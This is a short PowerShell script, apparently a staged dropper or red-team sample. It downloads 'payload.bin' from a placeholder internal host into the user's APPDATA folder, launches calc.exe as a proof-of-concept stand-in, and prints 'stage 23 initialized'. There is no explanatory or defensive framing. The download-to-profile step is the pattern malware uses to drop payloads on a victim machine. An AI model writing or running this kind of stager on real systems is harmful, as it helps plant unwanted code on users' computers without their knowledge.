
[CmdletBinding()]
param(
    [string]$DownloadUrl = "http://internal.corp/payload.bin",
    [string]$PayloadPath = "$env:APPDATA\payload.bin"
)
(New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $PayloadPath)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Write-Output "stage 23 initialized"
